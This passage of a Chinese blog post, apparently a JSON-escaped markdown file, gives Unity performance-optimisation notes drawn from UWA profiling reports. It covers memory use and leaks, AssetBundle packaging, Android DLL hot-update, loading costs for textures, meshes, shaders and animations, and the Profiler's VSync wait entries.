Batching操作的话，那么将很有可能进一步增大总体内存的占用.比如，100个Mesh进行拼合，其中99个Mesh均没有Color、Tangent等属性，剩下一个则包含有Color、Normal和Tangent属性，那么Mesh拼合后，CombinedMesh中将为每个Mesh来添加上此三个顶点属性，进而造成很大的内存开销。需要查看该模型的渲染Shader中是否需要这些数据进行渲染\n>> * \n\n### 二:引擎模块自身占用\n> * 引擎自身中存在内存开销的部分纷繁复杂，可以说是由巨量的“微小”内存所累积起来的,GameObject及其各种Component（最大量的Component应该算是Transform了）,ParticleSystem、MonoScript以及各种各样的模块Manager（SceneManager、CanvasManager、PersistentManager等)...\n一般情况下，上面所指出的引擎各组成部分的内存开销均比较小，真正占据较大内存开销的是这两处：**WebStream**   **SerializedFile** ,其绝大部分的内存分配则是由AssetBundle加载资源所致,当使用new WWW或CreateFromMemory来加载AssetBundle时，Unity引擎会加载原始数据到内存中并对其进行解压,而WebStream的大小则是AssetBundle原始文件大小 + 解压后的数据大小 + DecompressionBuffer(0.5MB).\n当你使用LoadFromCacheOrDownload、CreateFromFile或new WWW本地AssetBundle文件时产生的序列化文件.\n\n>> * 是否存在AssetBundle没有被清理干净的情况。开发团队可以通过Unity Profiler直接查看其使用具体的使用情况，并确定Take Sample时AssetBundle的存在是否合理；\n>> * 对于占用WebStream较大的AssetBundle文件（如UI Atlas相关的AssetBundle文件等），建议使用LoadFromCacheOrDownLoad或CreateFromFile来进行替换，即将解压后的AssetBundle数据存储于本地Cache中进行使用。这种做法非常适合于内存特别吃紧的项目，即通过本地的磁盘空间来换取内存空间。\n>> * AssetBundle管理机制:https://blog.uwa4d.com/archives/ABTheory.html\n\n\n### 三:托管堆内存占用\n> * 托管堆内存占用,不管是 Mono 版本还是 IL2CPP 版本,这里叫的方便一点,称为 Unity 内置托管虚拟机,其托管堆内存是由Unity 内置托管虚拟机分配和管理的。“托管” 的本意是Unity 内置托管虚拟机可以自动地改变堆的大小来适应你所需要的内存，并且适时地调用垃圾回收（Garbage Collection）操作来释放已经不需要的内存，从而降低开发人员在代码内存管理方面的门槛。\n\n>> * 用户不必要的堆内存分配主要来自于以下几个方面:\n>> * 高频率地 New Class/Container/Array等。研发团队切记不要在Update、FixUpdate或较高调用频率的函数中开辟堆内存，这会对你的项目内存和性能均造成非常大的伤害。做个简单的计算，假设你的项目中某一函数每一帧只分配100B的堆内存，帧率是1秒30帧，那么1秒钟游戏的堆内存分配则是3KB，1分钟的堆内存分配就是180KB，10分钟后就已经分配了1.8MB。如果你有10个这样的函数，那么10分钟后，堆内存的分配就是18MB，这期间，它可能会造成Mono的堆内存峰值升高，同时又可能引起了多次GC的调用。在我们的测评项目中，一个函数在10分钟内分配上百MB的情况比比皆是，有时候甚至会分配上GB的堆内存。\n>> * Log输出。我们发现在大量的项目中，仍然存在大量Log输出的情况。建议研发团队对自身Log的输出进行严格的控制，仅保留关键Log，以避免不必要的堆内存分配。对此，我们在UWA测评报告中对Log的输出进行了详细的检测，不仅提供详细的性能开销，同时占用Log输出的调用路径。这样，研发团队可直接通过报告定位和控制Log的输出。\n>> * UIPanel.LateUpdate。这是NGUI中CPU和堆内存开销最大的函数。它本身只是一个函数，但NGUI的大量使用使它逐渐成为了一个不可忽视规则。该函数的堆内存分配和自身CPU开销，其根源上是一致的，即是由UI网格的重建造成。因此，其对应的优化方法是直接查看CPU篇中的UI模块讲解。(1:动静分离在不同的 UIPanel 中,每组UIPanel下5~10个动态UI为宜)\n>> * String连接、部分引擎API（GetComponent）的使用 等等  \n\n### 内存占用标准\n> * 某些渠道对Android游戏的PSS内存进行了严格的限制。一般要求游戏的PSS内存在200MB以下。这是我们将Reserved Total内存设定在150MB的另外一个重要原因。(旧)\npss内存:进程的内存占用情况.有一些内存是多个进程共享的，我们计算的时候如果把这些计算进去进程的内存占用，显然会多算。\npss的意思是进程自己独自占有的+共享的/共享的数目。\n因此如果进程有自己独立的内存100M，和另外一个进程共享10M。\n那么pss就是100 + 10/2=105\n> * 较为合理的内存分配额度  \n纹理资源     0.33 内存资源        \n网格资源     0.13 内存资源    \n动画片段     0.1  内存资源    \n音频片段     0.1  内存资源    \nMono内存    0.26 内存资源    \n其他        0.06 内存资源    \n其中如果是 IL2CPP 版本的话,内存是可以返还给系统的,则无需按照这个分配额度进行分配\n\n### 四:内存泄露\n> * 内存泄露的误区:     \n>>* 误区一        \n我的项目进出场景前后内存回落不一致，比如进入场景后，内存增加40MB，出来后下降30MB，仍有10MB内存没有返回给系统，即说明内存存在泄露情况。\n>>* 误区二        \n我的项目在进出场景前后，Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落（出场景后的PSS值高于进场景前的PSS值），即说明内存存在泄露情况。  \n>>* 以上两种情况均不能表明内存存在泄漏问题,造成内存不能完全回落的情况有很多,资源加载后常驻内存以备后续使用,Mono堆内存的只升不降等等,这些均可造成内存无法完全回落\n\n### 五:检查资源的使用情况，特别是纹理、网格等资源的使用\n>* 资源泄漏是内存泄露的主要表现形式，其具体原因是用户对加载后的资源进行了储存（比如放到Container中），但在场景切换时并没有将其Remove或Clear，从而无论是引擎本身还是手动调用Resources.UnloadUnusedAssets等相关API均无法对其进行卸载，进而造成了资源泄露。对于这种情况的排查相当困难，这是因为项目中的资源量过于巨大，泄露资源往往很难定位\n>* UWA 推出通过资源的“生命周期”属性来快速查看有哪些资源是“常驻”内存的，并且判断该资源是“预加载”资源还是“泄露”资源.推出了资源的“场景比较”功能。建议大家通过以下两种方式进行资源比较，以便更快地找到存在“泄露”问题的资源.     \n一般来说，同种场景或同一场景的资源使用应该是较为固定的，比如游戏项目中的主城场景或主界面场景。通过比较不同时刻同一场景的资源信息，可以快速帮你找到其资源使用的差异情况。这样，你只需判断这些“差异”资源的存在是否合理，即可快速判定是否存在资源泄露，已经具体的泄露资源。        \n除一些常驻资源外，不同类型的场景，其资源使用是完全不同的。比如，游戏中主城和战斗副本的资源，除少部分常驻内存的资源外，二者使用的绝大部分资源应该是不一致的。所以，通过比较两种不同类型的场景，你可以直接查看比较结果中的“共同资源”，并判断其是否确实为预先设定好的常驻资源。如果不是，则它很可能是“泄露”资源，需要你进一步查看项目的资源管理是否存在漏洞。\n### 六:通过Profiler来检测WebStream或SerializedFile的使用情况\n> * AssetBundle的管理不当也会造成一定的内存泄露，即上一场景中使用的AssetBundle在场景切换时没有被卸载掉，而被带入到了下一场场景中。对于这种情况，建议直接通过Profiler Memory中的Take Sample来对其进行检测，通过直接查看WebStream或SerializedFile中的AssetBundle名称，即可判断是否存在“泄露”情况。\n\n### 七:通过Android PSS/iOS Instrument反馈的App线程内存来查看\n\n> * Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落”是有可能的，这是因为Unity Profiler反馈的是引擎的真实分配的物理内存，而PSS中记录的则包括系统的部分缓存。一般情况下，Android或iOS并不会及时将所有App卸载数据进行清理，为了保证下次使用时的流畅性，OS会将部分数据放入到缓存，待自身内存不足时，OS Kernel会启动类似LowMemoryKiller的机制来查询缓存甚至杀死一些进程来释放内存.     \n我们推荐的测试方式是在两个场景之间来回不停切换，比如主城和战斗副本间。理论上来说，多次切换同样的场景，如果Profiler中显示的Unity内存回落正常，那么其PSS/Instrument的内存数值波动范围也是趋于稳定的，但如果出现了PSS/Instrument内存持续增长的情况，则需要大家注意了。这可能有两种可能：       \nUnity引擎自身的内存泄露问题。这种概率很小，之前仅在少数版本中出现过。       \n第三方插件在使用时出现了内存泄露。这种概率较大，因为Profiler仅能对Unity自身的内存进行监控，而无法检测到第三方库的内存分配情况。因此，在出现上述内存问题时，建议大家先对自身使用的第三方库进行排查。     \n\n### 八:无效的Mono堆内存开销\n> * 无效的Mono堆内存。它是Mono所分配的堆内存，但却没有被真正利用上，因此称之为“无效”,如何查看我的项目中是否存在较大量的“无效堆内存”呢？     \nUWA测评报告中:蓝线的Reserved Total为当前项目所占据的总物理内存，而紫线的Used Total为当前项目所使用的总物理内存不一致,Reserved Total - Used Total为空闲内存,而这其中主要由两部分组成，空闲的Unity引擎内存和无效的Mono堆内存.     \n我们应该如何避免或减少过多“无效堆内存”的分配呢？        \n>> * 避免一次性堆内存的过大分配。Mono的堆内存也是“按需”逐步进行分配的。但如果一次性开辟过大堆内存，比如New一个较大Container、加载一个过大配置文件等，则势必会造成Mono的堆内存直接冲高，所以研发团队对堆内存的分配需要时刻注意；\n>> * 避免不必要的堆内存开销。UWA测评报告中将项目运行过程中堆内存分配Top10函数进行罗列，限于篇幅，我们不再此处进行一一赘述，研发团队可以直接查看之前一篇的内存优化相关文章。\n\n\n### 九:资源冗余\n在内存管理方面，还有一个大家必须关注的话题——资源冗余。在我们测评过的大量项目中，95%以上的项目均存在不同程度的资源冗余情况。所谓“资源冗余”，是指在某一时刻内存中存在两份甚至多份同样的资源。导致这种情况的出现主要有两种原因：       \n>* 1、AssetBundle打包机制出现问题.同一份资源被打入到多份AssetBundle文件中。举个例子，同一张纹理被不同的NPC所使用，同时每个NPC被制作成独立的AssetBundle文件，那么在没有针对纹理进行依赖打包的前提下，就会出现该张纹理出现在不同的NPC AssetBundle文件中。当这些AssetBundle先后被加载到内存后，内存中即会出现纹理资源冗余的情况。对此，我们建议研发团队在发现资源冗余问题后，对相关AssetBundle的制作流程一定要进行检查。同时，我们在UWA测评中为每个资源引入了一个衡量指标——“数量峰值”。它指的是同一资源在同一帧中出现的最大数量。如果大于1，则说明该资源很可能存在 “冗余资源”。大家可以通过这一列进行排序，即可立即查看项目中的资源冗余情况。\n>* 2.资源的实例化所致.在Unity引擎中，当我们修改了一些特定GameObject的资源属性时，引擎会为该GameObject自动实例化一份资源供其使用，比如Material、Mesh等。以Material为例，我们在研发时经常会有这样的做法：在角色被攻击时，改变其Material中的属性来得到特定的受击效果。这种做法则会导致引擎为特定的GameObject重新实例化一个Material，后缀会加上（instance）字样。其本身没有特别大的问题，但是当有改变Material属性需求的GameObject越来越多时（比如ARPG、MMORPG、MOBA等游戏类型），其内存中的冗余数量则会大量增长。如下图所示，随着游戏的进行，实例化的Material资源会增加到333个。虽然Material的内存占用不大，但是过多的冗余资源却为Resources.UnloadUnusedAssets API的调用效率增加了相当大的压力。    \n一般情况下，资源属性的改变情况都是固定的，并非随机出现。比如，假设GameObject受到攻击时，其Material属性改变随攻击类型的不同而有三种不同的参数设置。那么，对于这种需求，我们建议你直接制作三种不同的Material，在Runtime情况下通过代码直接替换对应GameObject的Material，而非改变其Material的属性。这样，你会发现，成百上千的instance Material在内存中消失了，取而代之的，则是这三个不同的Material资源\n\n****\n\n# 性能优化,AssetBundle 打包\n* https://blog.uwa4d.com/archives/ABtopic_2.html\n>* 唯一API,BuildPipeline.BuildAssetBundles,引擎将自动根据资源的assetbundleName属性（以下简称abName）批量打包，自动建立Bundle以及资源之间的依赖关系。\n>* 打包规则,在资源的Inpector界面最下方可设置一个abName，每个abName（包含路径）对应一个Bundle，即abName相同的资源会打在一个Bundle中。如果所依赖的资源设置了不同的abName，则会与之建立依赖关系，避免出现冗余。支持增量式发布，即在资源内容改变并重新打包时，会自动跳过内容未变的Bundle。因此，相比4.x，会极大地缩短更新Bundle的时间。\n>* 5.x下默认开启的三个选项（CompleteAssets ，用于保证资源的完备性；CollectDependencies，用于收集资源的依赖项；DeterministicAssetBundle，用于为资源维护固定ID.对于移动平台，5.x下默认会将TypeTree信息写入AssetBundle，因此在移动平台上DisableWriteTypeTree选项也变得有意义了.\n> * Manifest文件,5.x中的依赖关系,在打包后生成的文件夹中，每个Bundle都会对应一个manifest文件，记录了Bundle的一些信息，但这类manifest只在增量式打包时才用到；同时，根目录下还会生成一个同名manifest文件及其对应的Bundle文件，通过该Bundle可以在运行时得到一个AssetbundleManifest对象,而所有的Bundle以及各自依赖的Bundle都可以通过该对象提供的接口进行获取.即你打包输出的一个文件里面有个同名的 xxx 和一个 xxx.manifest 通过这2个文件你可以获取到一个AssetbundleManifest对象,用于取出各个 AB 包的依赖关系\n> *  Variant参数,就是Inpector界面最下方最右侧的名字,Variant参数能够让AssetBundle方便地进行“多分辨率支持”,打包时，Variant会作为后缀添加在Bundle名字之后。相同abName，不同variant的Bundle中，资源必须是一一对应的，且他们在Bundle中的ID也是相同的，从而可以起到相互替换的作用。当需要为手机和平板上的某个UI界面使用两套分辨率不同的纹理、Shader，以及文字提示时，借助Variant的特性，只需创建两个文件夹，分别放置两套不同的资源，且资源名一一对应，然后给两个文件夹设置相同的abName和不同的variant，再给UI界面设置abName，然后进行打包即可。运行时，先选择合适的依赖包加载，那么后续加载UI界面时，会根据已加载的依赖包，呈现出相对应的版本。\n> * abName可通过脚本进行设置和清除，也可以通过构造一个AssetBundleBuild数组来打包。\n> * 开启DisableWriteTypeTree可能造成AssetBundle对Unity版本的兼容问题，但会使Bundle更小，同时也会略微提高加载速度。\n> * Prefab之间不会建立依赖，即如果Prefab-A和Prefab-B引用了同一张纹理，而他们设置了不同的abName，而共享的纹理并未设置abName，那么Prefab-A和Prefab-B可视为分别打包，各自Bundle中都包含共享的纹理。因此在使用UGUI，开启Sprite Packer时，由于Atlas无法标记abName，在设置UI界面Prefab的abName时就需要注意这个问题。\n> * 5.x中加入了Shader stripping功能,在打包时，默认情况下会根据当前场景的Lightmap及Fog设置对资源中的Shader进行代码剥离。这意味着，如果在一个空场景下进行打包，则Bundle中的Shader会失去对Lightmap和Fog的支持，从而出现运行时Lightmap和Fog丢失的情况.而通过将Edit->Project Settings->Graphics下shader Stripping中的modes改为Manual，并勾选相应的mode即可避免这一问题。\n\n\n\n\n# Android平台的代码热更新\n\n* 为何不能代码热更新 https://blog.uwa4d.com/archives/HotFix.html\n\n*  Android平台的代码热更新,该原理是解除资源和代码的关系，将代码编译成dll，在游戏一运行时动态加载。\n> * 分离.对于脚本我们可以简单地将脚本分为数据(变量)和逻辑(方法)两部分：例如A.cs -> Uwa4dDataA.cs和Uwa4dLogicA.cs。其中Uwa4dDataA.cs中只有成员变量而Uwa4dLogicA.cs和A.cs基本一致。分离后的问题是，依赖了A.cs的资源再也找不到A.cs。因为二者之间的依赖是通过资源文件保存的，所以只需要将资源文件的对于A.cs的依赖替换成 Uwa4dDataA.cs的依赖即可。\n> *  将Uwa4dLogicA.cs编译成Dll,首先将Uwa4dDataA.cs编译成Assembly-CSharp.dll，然后编译Uwa4dLogicA.cs(依赖Assembly-CSharp.dll)，另外要注意编译时.Net的兼容版本。\n> * 加载Uwa4dLogicA.cs\n加载Uwa4dLogicA.cs编译后的DLL，获得Uwa4dLogicA.cs后通过AddComponent将其挂在相应的资源上，并利用Uwa4dDataA.cs对于其数据进行初始化。\n\n****\n\n# Unity纹理加载\n资源加载、资源卸载、Object的实例化和代码的序列化是最耗时的\n\n* 资源加载,资源加载是加载模块中最为耗时的部分,CPU开销在Unity引擎中主要体现在Loading.UpdatePreloading和Loading.ReadObject两项中.\n> * Loading.UpdatePreloading，这一项仅在调用类似LoadLevel（Async）的接口处出现,主要负责卸载当前场景的资源，并且加载下一场景中的相关资源和序列化信息等.下一场景中，自身所拥有的GameObject和资源越多，其加载开销越大。\n> * 在很多项目中，存在另外一种加载方式，即场景为空场景，绝大部分资源和GameObject都是通过OnLevelWasLoaded回调函数中进行加载、实例化和拼合的。对于这种情况，Loading.UpdatePreloading的加载开销会很小。\n> * Loading.ReadObject，这一项记录的则是资源加载时的真正资源读取性能开销，基本上引擎的主流资源（纹理资源、网格资源、动画片段等等）读取均是通过该项来进行体现。可以说，这一项很大程度上决定了项目场景的切换效率。正因如此，我们就当前项目中所用的主流资源进行了大量的测试和分析，下面我们将分析结果与大家一起分享，希望可以帮到正在进行开发的你。\n* 纹理资源,纹理资源是项目加载过程中开销占用最大的资源之一，其加载效率由其自身大小决定。决定纹理资源大小的因素主要有三种：分辨率、格式和Mipmap是否开启。\n> * 分辨率和格式是影响纹理资源加载效率的重要因素，因为这两项的设置对纹理资源的大小影响很大。1、纹理资源的分辨率对加载性能影响较大，分辨率越高，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、设备越好，加载效率确实越高。但是，对于硬件支持纹理（ETC1/PVRTC）来说,中高端设备的加载效率差别已经很小，比如图中的红米Note2和三星S6设备，差别已经很不明显。\n> * 纹理资源的格式对加载性能影响同样较大，Android平台上，ETC1和ETC2的加载效率最高。同样，iOS平台上，PVRTC 4BPP的加载效率最高。\n> * RGBA16格式纹理的加载效率同样很高，与RGBA32格式相比，其加载效率与ETC1/PVRTC非常接近，并且设备越好，加载开销差别越不明显；\n> * RGBA32格式纹理的加载效率受硬件设备的性能影响较大，ETC/PVRTC/RGBA16受硬件设备的影响较低。\n> * 这里需要指出的是测试中所使用的ETC1和ETC2纹理均为RGB 4Bit格式,所以对于半透明纹理贴图，需要两张ETC1格式的纹理进行支持（一张RGB通道，一张Alpha通道）。逐一加载两张ETC1格式的纹理，其加载效率要低于RGBA16格式，但可以通过加载方式来进行弥补.\n> *  开启Mipmap功能,开启Mipmap功能同样会增大一部分纹理大小，一般来说，其内存会增加至原始大小的1.33倍。开启Mipmap功能会导致资源加载更为耗时，且设备性能越差，其加载效率影响越大.\n>> * 1、严格控制RGBA32和ARGB32纹理的使用，在保证视觉效果的前提下，尽可能采用“够用就好”的原则，降低纹理资源的分辨率，以及使用硬件支持的纹理格式。\n>> * 2、在硬件格式（ETC、PVRTC）无法满足视觉效果时，RGBA16格式是一种较为理想的折中选择，既可以增加视觉效果，又可以保持较低的加载耗时。\n>> * 3、严格检查纹理资源的Mipmap功能，特别注意UI纹理的Mipmap是否开启。在UWA测评过的项目中，有不少项目的UI纹理均开启了Mipmap功能，不仅造成了内存占用上的浪费，同时也增加了不小的加载时间。\n>> * 4、ETC2对于支持OpenGL ES3.0的Android移动设备来说，是一个很好的处理半透明的纹理格式。但是，如果你的游戏需要在大量OpenGL ES2.0的设备上进行运行，那么我们不建议使用ETC2格式纹理。因为不仅会造成大量的内存占用（ETC2转成RGBA32），同时也增加一定的加载时间。下图为测试2中所用的测试纹理在三星S3和S4设备上加载性能表现。可以看出，在OpenGL ES2.0设备上，ETC2格式纹理的加载要明显高于ETC1格式，且略高于RGBA16格式纹理。因此，建议研发团队在项目中谨慎使用ETC2格式纹理。\n\n****\n\n# Unity网格加载模块\n\n* 网格资源,网格资源与纹理资源一样，在加载时同样会造成较高的CPU占用，且其加载效率由其自身大小（网格数据量）决定。\n> * 不同面片数的网格资源加载效率测试,1、资源的数据量对加载性能影响较大，面片数越多，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、随着硬件设备性能的提升，其加载效率差异越来越不明显。\n> * 相同面片数、不同顶点属性的加载效率测试,1、顶点属性的增加对内存和AssetBundle包体大小影响较大。与测试1中未引入Tangent顶点属性的网格数据相比，测试2中的网格数据在内存上均大幅度增加（增加量与网格顶点数有关），且AssetBundle大小同样有成倍（1~2）的增加。2、顶点属性增加对于加载效率影响较大，且顶点数越多，影响越大。\n> * 模型常见的顶点属性主要有Position、UV、Normal、Tangent和Color。Color属性与Tangent属性一样，如果网格顶点拥有该属性，同样会对内存、物理体积和加载性能造成影响。在使用Draw Call Batching时，不要将不同属性的网格模型拼合在一起。在使用Draw Call Batching时，切忌将不同属性的网格模型拼合在一起。举个例子 ，100个网格模型进行Static Batching，如果99个模型只有Position和UV两种属性，而剩下1个模型函数有Position、UV、Normal、Tangent和Color五种属性。那么引擎在进行拼合时，会将前99个模型的顶点属性补齐，然后再进行拼合。这样无形中会增加大量的内存占用，从而造成不必要的内存浪费。\n> * 开启/关闭Read/Write功能的加载效率测试,1、关闭Read/Write功能会降低AssetBundle的物理大小，其降低量与资源本身数据量相关。同时，关闭Read/Write功能会大幅度降低网格资源的内存占用；2、关闭Read/Write功能会略微提升该资源的加载效率。\n>> * 1、在保证视觉效果的前提下，尽可能采用“够用就好”的原则，即降低网格资源的顶点数量和面片数量；\n>> * 2、研发团队对于顶点属性的使用需谨慎处理。通过以上分析可以看出，顶点属性越多，则内存占用越高，加载时间越长；\n>> * 3、如果在项目运行过程中对网格资源数据不进行读写操作（比如Morphing动画等），那么建议将Read/Write功能关闭，既可以提升加载效率，又可以大幅度降低内存占用。\n\n****\n\n# Unity Shader 加载模块\n\n* Shader资源与之前的网格资源和纹理资源不同，其本身物理Size很小。Shader资源的效率加载瓶颈并不在其自身大小的加载上，而是在Shader内容的解析上.\n>* 1、Shader资源的物理体积与内存占用虽然很小，但其加载耗时开销的CPU占用很高，这主要是因为Shader的解析CPU开销很高，成为了Shader资源加载的性能瓶颈；\n>* 2、Mobile/Particles Additive在解析方面的耗时远小于Mobile/Diffuse、Mobile/Bumped Diffsue甚至Mobile/VertexLit;\n>* 3、除Mobile/Particles Additive外，其他三个(Mobile-Diffuse，Mobile-VertexLit，Mobile-Bumped Diffuse)主流Shader在加载时均会造成明显的降帧，甚至卡顿。因此，研发团队应尽可能避免在非切换场景时刻进行Shader的加载操作；\n>* 4、Mobile Shader较之同种Normal Shader在加载方面确实有一定的性能提升；\n>* 5、Shader的加载开销经常在几百甚至上千毫秒以上,其加载耗时居然要高于几张Atlas纹理或者拥有上万片面的Mesh网格!!\n* Shader解析时的真正耗时原因    \n>* 一般情况下，Shader加载的CPU耗时与其Keyword数量有关，Keyword数量越多，则加载开销也越大。Shader的Keyword数量是会随着场景设置的不同而变化的。在Unity 5.x中，Unity默认会根据场景设置、Shader Pass等来调整Shader的Keyword，比如如果存在Lightmap的使用，则会默认将对应的Keyword打开，而对于没有使用Fog的项目，则会直接将相关Keyword关闭。\n>* 对于Unity 5.x项目，可通过skip_variants操作在Shader中直接去除相关Keyword。\n>* 直接去除Shader中的Fallback选项。Fallback功能是对于无法使用当前Shader的硬件设备可以使用对硬件设备要求更低的Fallback Shader来进行渲染，以保证渲染的稳定性。\n* Shader加载方式,5.x之后的Shader加载只是加载,加载之后还需要运行时编译,需要主动使用shader.WarmupAllShaders又或者ShaderVariantCollection.WarmUp来编译shader\n>* 大量相同Shader重复解析造成的。是因为Shader被打包到不同的AssetBundle文件中，每次切换场景时，AssetBundle均会被频繁地进行加载和卸载，从而造成了大量相同的Shader被重复加载和卸载。\n>* 1、通过依赖关系打包，将项目中的所有Shader抽离并打成一个独立的AssetBundle文件，其他AssetBundle与其建立依赖；并对其进行预加载，以降低后续不必要的加载开销。\n>* 2、Shader的AssetBundle文件在游戏启动后即进行加载并常驻内存，因为一款项目的Shader种类数量一般在50~100不等，且每个均很小，即便全部常驻内存，其内存总占用量也不会超过2MB；\n>* 3、后续Prefab加载和实例化后，Unity引擎会通过AssetBundle之间的依赖关系直接找到对应的Shader资源进行使用，而不会再进行加载和解析操作。\n>* 4、正在使用Resources.Load来加载资源的研发团队，可以尝试使用ShaderVariantCollection(着色器变体群,着色器资源列表，是一个由通道类型+着色器关键字组合的列表)来对Shader进行Preload,同样也可以达到避免相同Shader重复加载的效果。https://www.cnblogs.com/rexzhao/p/7884905.html\n>* 5、在生成时剔除多余着色器变体, 1)个别着色器特性，比如使用 #pragma shader_feature的着色器，如果没有材质使用到了这个特性，那么就不会把它打包进去；2)没有被任何场景使用到的雾效(Fog)或光照贴图模式(Lightmap)的着色器变体，也不会打包进去。\n>* 6.shader加载造成的卡顿有两种情况：1、着色器变种已经打包到APP中，只需要加载该变体，创建GPUProgram就可以了.2、着色器变种没用被打包，这时需要shaderlab文件进行解析和编译相应的变种，然后创建GUPProgram\n\n****\n\n# Unity动画加载模块\n\n* AnimationClip资源是项目运行时最常加载的资源之一，且其加载效率主要由其自身加载量决定，而决定AnimationClip资源加载量的主要因素则是它的压缩格式。\n>* Unity引擎对导入的AnimationClip提供三种压缩格式，Off、Keyframe Reduction和Optimal。Off表示不采用压缩处理；Keyframe Reduction表示使用关键帧进行处理，Optimal则表示Unity引擎会根据动画曲线的特点来自动选择一个最优的压缩方式，可能是关键帧压缩，也可能是Dense压缩。https://docs.unity3d.com/Manual/class-Animator.html\n>* Optimal压缩方式确实可以提升资源的加载效率，无论是在高端机、中端机还是低端机上；\n>* 硬件设备性能越好，其加载效率越高。但随着设备的提升，Keyframe Reduction和Optimal的加载效率提升已不十分明显；\n>* Optimal压缩方式可能会降低动画的视觉质量，因此，是否最终选择Optimal压缩模式，还需根据最终视觉效果的接受程度来决定。\n\n\n\n\n\n****\n\n# Xcode 增量打包\nhttps://blog.uwa4d.com/archives/USparkle_iOS.html\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n****\n\n\n## Overview 类型\n* 1 Profiler中WaitForTargetFPS详解 https://blog.csdn.net/suifcd/article/details/50942686\n该参数一般出现在 CPU开销过低，且通过设定了目标帧率的情况下（Application.targetFrameRate）。当上一帧低于目标帧率时，将会在本帧产生一个WaitForTargetFPS的空闲等待耗时，以维持目标帧率。\nGfx.WaitForPresent && Graphics.PresentAndSync\n这两个参数在Profiler中经常出现CPU占用较高的情况，且仅在发布版本中可以看到。究其原因，其实是CPU和GPU之间的垂直同步（VSync）导致的，之所以会有两种参数，主要是与项目是否开启多线程渲染有关。当项目开启多线程渲染时，你看到的则是Gfx.WaitForPresent；当项目未开启多线程渲染时，看到的则是Graphics.PresentAndSync。\nGraphics.PresentAndSync 是指主线程进行Present时的等待时间和等待垂直同步的时间。Gfx.WaitForPresent其字面意思同样也是进行Present时需要等待的时间，但这里其实省略了很多的内容。其真实的意思应该是为了在渲染子线程（Rendering Thread）中进行Present，当前主线程（MainThread）需要等待的时间。\n\n当项目开启多线程程渲染时，引擎会将Present等相关工作尽可能放到渲染线程去执行，即主线程只需通过指令调用渲染线程，并让其进行Present，从而来降低主线程的压力。但是，当CPU希望进行Present操作时，其需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Gfx.WaitForPresent时间，如下图所示。\n![多线程渲染1](多线程渲染1.png)\n\n同理，当项目未开启多线程渲染时，引擎会在主线程中进行Present(当前绝大多数的移动游戏均在使用该中操作)，当然，Present操作同样需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Graphics.PresentAndSync时间:\n![多线程渲染2](多线程渲染2.png)\n所以，如果你的项目中，Gfx.WaitForPresent或Graphics.PresentAndSync的CPU耗时非常高时，其实并不是它们自己做了什么神秘的操作，而是你当前的渲染任务太重，GPU负载过高所致。\n\n同时，对于开启垂直同步的项目而言，Gfx.WaitForPresent 和 Graphics.PresentAndSync也会出现CPU占用较高的情况。在解释这种问题之前，我们先以“大家乘坐地铁”来举个例子。一般来说，地铁到达每一站的时间均是平均且一定的，假设每10分钟一班接走一批乘客。但是几乎没有多少乘客可以按点到达，如果提前两分钟到达，则只需要等待两分钟即可乘上地铁，但是，如果你错过了，哪怕只差了一分钟，那么你也不得不再等待九分钟才能乘上地铁。\n\n上述的情况我们经常会遇到。在GPU的渲染流水线中，其转换front buffer和back buffer的工作原理和“乘坐地铁”其实是一致的。大家可以把GPU的流水线简单地想象成为一列地铁。对于移动设备来说，GPU的帧率一般为30帧/秒或60帧/秒，即VSync每33ms或每16.6ms“到站一次”，CPU的Present即为“乘客乘上地铁”，然后前往各自的目的地。与乘客的早到和晚到一样，CPU的Present也会出现类似的情况，比如：\n\n● CPU端开销非常小，Present在很早即被执行，但此时VSync还没到，则会出现较高的等待时间，即Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销看上去很高。\n● CPU端开销很高，使得Present执行时错过了VSync操作，这样，Present将不得不等待下一次VSync的到来，从而造成了Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销较高。这种情况在CPU端加载过量资源时特别容易发生，比如WWW加载较大的AssetBundle、Resource.Load加载大量的Texture等等。\n\n通过以上的讲解，我们希望此刻的你已经对Gfx.WaitForPresent 和 Graphics.PresentAndSync已经有了深入的理解。这两个参数无论CPU占用多少，其实都不是这两个参数的自身问题，而是项目的其他部分造成。对此，我们做一个总结，以方便你进一步加深印象。\n\n造成这两个参数的CPU占用较高的原因主要有以下三种原因：\n\n```\n\n● CPU开销非常低，所以CPU在等待GPU完成渲染工作或等待VSync的到来；\n● CPU开销很高，使Present错过了当前帧的VSync，即不得不等待下一次VSync的到来；\n● GPU开销很高，CPU的Present需要等待GPU上一帧渲染工作的完成。    \n\n最后，如何优化并降低这两个参数的CPU占用呢？ 那就是，忽略Gfx.WaitForPresent 和 Graphics.PresentAndSync这两个参数，优化其他你能优化的一切！\n\n```\n# UnityEngine.SetupCoroutine:InvokeMoveNext\n\n\n****","source":"_posts/Unity/Optimize/软件UWA优化.md","raw":"---\ntitle: Unity UWA工具检测优化\ndate: 2020-05-08 11:41:32\ntop: 4\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n# 性能优化大合集,请看下面的官方介绍\n* UWA 优化百科向导: https://blog.uwa4d.com/archives/Index.html  \n* UWA Unity性能优化大合集，All In One ! https://blog.uwa4d.com/archives/allinone.html\n* 如何看懂性能报告  https://blog.uwa4d.com/archives/Simple_PA_General.html\n\n\n****\n\n\n# 性能总结\n* 查看这个性能分析图,性能总结--> https://www.uwa4d.com/demo/pa.html?v=5x&platform=android&name=jws&device=RedMiNote2 \n>* 总体帧数：以一秒 30 帧为例,10 分钟测试,理想性能帧数可以跑到16000~18000帧,如果项目帧数低于这个范围，那么你的游戏可能正在经受一定的帧率卡顿问题,需要查看某一段时间内的性能瓶颈       \n>* 总场景数     \n>* GC次数：测试过程中系统垃圾回收操作（Garbage Collection）的调用次数,每次GC调用均会造成一定程度上的卡顿，降低了项目运行的流畅度,如果开发人员的逻辑代码分配堆内存过大过快的话，则GC调用的次数也会随之增加,标准为1000帧/次以上调用 GC,这个值越大调用一次 GC 越好.      \n>* CPU均值：测试过程中平均每帧的CPU占用.高/中/低档的主流机型,设备性能越好，CPU耗时的均值肯定是越低        \n>* CPU 占用(帧数占比):这个地方是 4 